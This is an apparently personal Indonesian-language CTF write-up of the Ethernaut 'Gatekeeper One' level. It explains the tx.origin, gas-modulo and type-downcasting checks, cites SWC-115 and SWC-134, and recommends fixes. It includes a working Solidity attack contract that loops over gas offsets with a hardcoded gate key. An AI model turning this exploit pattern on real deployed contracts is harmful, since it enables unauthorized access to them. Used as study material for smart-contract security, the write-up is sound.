## Gatekeeper One — Level 13

### Alur Logika Contract
oke pada gatekepeer one ini aku harus menjadi peserta yang dapat melewati 3 penjaga penjaga yang pertama msg.sender!=tx.origin yang berarti pengirim tidak boleh sama bisa pakai contract 
lalu penjaga ke dua gasleft %8191 ==0
lalu penjaga ke 3 memiliki 3 permintaan yaitu
32 bit bawah harus sama dengan 16 bit bawah.
32 bit bawah harus berbeda dengan 64 bit penuh.
32 bit bawah harus sama dengan 4 digit terakhir alamat wallet-mu.
lalu ada 1 function yaitu enter yang require nya adalah entrant = tx.origin

### Vulnerability
Nama: SWC-115
Penjelasan:Penggunaan tx.origin untuk Autentikasi 
Nama: SWC-134
Penjelasan: :Ketergantungan pada Nilai Gas (Gas Dependency) 

### Impact
Penyerang dapat mendaftarkan diri sebagai entrant yang sah 
tanpa otorisasi, melewati tiga lapisan proteksi sekaligus 
dengan memanfaatkan perbedaan tx.origin vs msg.sender, 
manipulasi gas, dan downcasting tipe data yang tidak aman.

### Cara Eksploit
menggunakan contract untuk menyerang dengan format

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKepeerOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract gatekepeeroneattack { 
    IGateKepeerOne public targetContract; 

    constructor(address _gatekepeer) {
        targetContract = IGateKepeerOne (_gatekepeer);
    }

    function attack() public {
    bytes8 gateKey = 0x000000010000044d;
    
    for (uint256 i = 0; i < 8191; i++) {
        (bool success,) = address(targetContract).call{gas: 8191 * 3 + i}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if (success) break;
    }
}
}


### Rekomendasi Fix
 Jangan Gunakan tx.origin untuk Otorisasi (Solusi Gate 1)
 Hindari Logika yang Bergantung pada Sisa Gas (Solusi Gate 2)
 Gunakan SafeCast dan Hindari Downcasting Manual (Solusi Gate 3)